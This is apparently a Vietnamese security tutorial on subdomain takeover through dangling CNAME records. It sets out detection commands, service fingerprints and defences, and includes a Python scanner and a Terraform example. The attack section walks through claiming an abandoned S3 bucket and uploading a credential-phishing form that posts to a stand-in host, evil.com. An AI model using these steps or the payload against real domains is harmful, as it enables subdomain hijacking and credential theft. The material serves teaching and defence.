# Subdomain Takeover

> **OWASP Top 10:2025**: A02 – Security Misconfiguration | **CWE**: CWE-284 | **Nguồn**: HackTricks, Bug Bounty Research

## 🧱 Kiến thức Nền tảng

Hệ thống **DNS (Domain Name System)** cho phép ánh xạ tên miền sang địa chỉ IP hoặc sang một tên miền khác thông qua **bản ghi CNAME** (Canonical Name). Khi tổ chức sử dụng dịch vụ cloud bên thứ ba (AWS S3, Heroku, GitHub Pages, Azure), họ thường tạo CNAME record trỏ subdomain của mình đến endpoint của provider.

```bash
# Normal DNS configuration: subdomain points to cloud service
$ dig blog.company.com CNAME +short
company-blog.herokuapp.com

# DNS resolution chain:
# blog.company.com → CNAME → company-blog.herokuapp.com → A → 52.x.x.x
# Browser requests blog.company.com → gets content from Heroku app
```

```text
# Example DNS zone file for company.com
; Subdomain CNAME records pointing to external services
blog.company.com.       IN  CNAME  company-blog.herokuapp.com.
docs.company.com.       IN  CNAME  company-docs.s3-website-us-east-1.amazonaws.com.
status.company.com.     IN  CNAME  company.github.io.
landing.company.com.    IN  CNAME  company-landing.azurewebsites.net.
```

Quy trình hoạt động bình thường: DNS CNAME trỏ đến cloud service → cloud service nhận request → trả về nội dung hợp lệ. Tuy nhiên, vấn đề phát sinh khi tổ chức **ngừng sử dụng dịch vụ cloud** (xóa S3 bucket, unprovision Heroku app) nhưng **quên xóa bản ghi CNAME** trong DNS.

## 🔍 Mô tả lỗ hổng

Subdomain Takeover xảy ra khi bản ghi CNAME trỏ đến một dịch vụ **đã bị hủy hoặc không còn tồn tại** (gọi là **dangling CNAME**). Kẻ tấn công có thể **đăng ký lại dịch vụ đó** trên cloud provider với cùng tên, từ đó chiếm quyền kiểm soát nội dung được phục vụ trên subdomain của nạn nhân.

Hậu quả nghiêm trọng:
- **Phishing**: hiển thị trang giả mạo trên domain hợp lệ của tổ chức
- **Cookie theft**: nếu cookie được set cho `*.company.com`, attacker có thể đọc cookie từ subdomain bị chiếm
- **Bypass CSP/CORS**: subdomain bị chiếm có thể nằm trong whitelist của ứng dụng chính

## ⚔️ Cơ chế tấn công

**Bước 1: Phát hiện dangling CNAME**

```bash
# Enumerate subdomains using subfinder + httpx
subfinder -d company.com -silent | httpx -status-code -title -follow-redirects

# Check for dangling CNAME indicators
$ dig docs.company.com CNAME +short
company-docs.s3-website-us-east-1.amazonaws.com

$ curl -s https://docs.company.com
# Response: "404 Not Found — NoSuchBucket" ← S3 bucket deleted!
```

**Bước 2: Fingerprint dịch vụ bị bỏ rơi**

```text
# Common fingerprints for vulnerable services:
| Service        | CNAME Pattern                          | Error Signature                    |
|----------------|----------------------------------------|------------------------------------|
| AWS S3         | *.s3.amazonaws.com                     | "NoSuchBucket"                     |
| Heroku         | *.herokuapp.com                        | "No such app"                      |
| GitHub Pages   | *.github.io                            | "There isn't a GitHub Pages site"  |
| Azure          | *.azurewebsites.net                    | "404 Web Site not found"           |
| Shopify        | shops.myshopify.com                    | "Sorry, this shop is unavailable"  |
```

**Bước 3: Claim dịch vụ và chiếm subdomain**

```bash
# Example: Taking over an abandoned S3 bucket
# 1. Create S3 bucket with the EXACT name from the CNAME
aws s3 mb s3://company-docs --region us-east-1

# 2. Enable static website hosting
aws s3 website s3://company-docs \
  --index-document index.html

# 3. Upload malicious content
echo '<h1>Account Verification Required</h1>
<form action="https://evil.com/phish" method="POST">
  <input name="email" placeholder="Corporate Email">
  <input name="password" type="password" placeholder="Password">
  <button type="submit">Verify</button>
</form>' > index.html

aws s3 cp index.html s3://company-docs/ --acl public-read

# docs.company.com now serves attacker-controlled content!
```

## 🛡️ Biện pháp phòng thủ

1. **DNS hygiene**: thiết lập quy trình review — khi decommission service, **xóa CNAME record ngay lập tức**
2. **Monitoring tự động**: sử dụng tool như `subjack`, `nuclei` để scan dangling CNAME định kỳ
3. **Domain verification**: một số provider (GitHub Pages) hỗ trợ TXT record verification — bật tính năng này
4. **Wildcard protection**: tránh sử dụng wildcard DNS (`*.company.com`) trỏ đến external service
5. **Cookie scoping**: không set cookie cho wildcard domain `*.company.com`, sử dụng `__Host-` prefix

## 💻 Code Example

```python
# === DETECTION SCRIPT: Scan for dangling CNAMEs ===
import dns.resolver
import requests

FINGERPRINTS = {
    "herokuapp.com": "No such app",
    "s3.amazonaws.com": "NoSuchBucket",
    "github.io": "There isn't a GitHub Pages site",
    "azurewebsites.net": "404 Web Site not found",
}

def check_subdomain(subdomain):
    """Check if a subdomain has a dangling CNAME"""
    try:
        # Resolve CNAME record
        answers = dns.resolver.resolve(subdomain, 'CNAME')
        cname_target = str(answers[0].target).rstrip('.')

        # Check if CNAME points to a known vulnerable service
        for service, fingerprint in FINGERPRINTS.items():
            if service in cname_target:
                try:
                    resp = requests.get(f"http://{subdomain}", timeout=5)
                    if fingerprint in resp.text:
                        return {
                            "subdomain": subdomain,
                            "cname": cname_target,
                            "service": service,
                            "status": "VULNERABLE",
                        }
                except requests.RequestException:
                    return {
                        "subdomain": subdomain,
                        "cname": cname_target,
                        "service": service,
                        "status": "POTENTIALLY_VULNERABLE",
                    }
    except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer):
        pass
    return {"subdomain": subdomain, "status": "SAFE"}


# === PREVENTION: Terraform DNS management ===
# Infrastructure-as-Code ensures DNS records are tied to resource lifecycle
# When the resource is destroyed, the CNAME is automatically removed

# resource "aws_s3_bucket" "docs" {
#   bucket = "company-docs"
# }
#
# resource "aws_route53_record" "docs_cname" {
#   zone_id = aws_route53_zone.main.zone_id
#   name    = "docs.company.com"
#   type    = "CNAME"
#   ttl     = 300
#   records = [aws_s3_bucket.docs.website_endpoint]
#   # When S3 bucket is destroyed, this DNS record is also destroyed
# }
```

## 📚 Nguồn tham khảo
- HackTricks: https://book.hacktricks.wiki/en/pentesting-web/domain-subdomain-takeover.html
- Can I Take Over XYZ: https://github.com/EdOverflow/can-i-take-over-xyz
- CWE-284: https://cwe.mitre.org/data/definitions/284.html
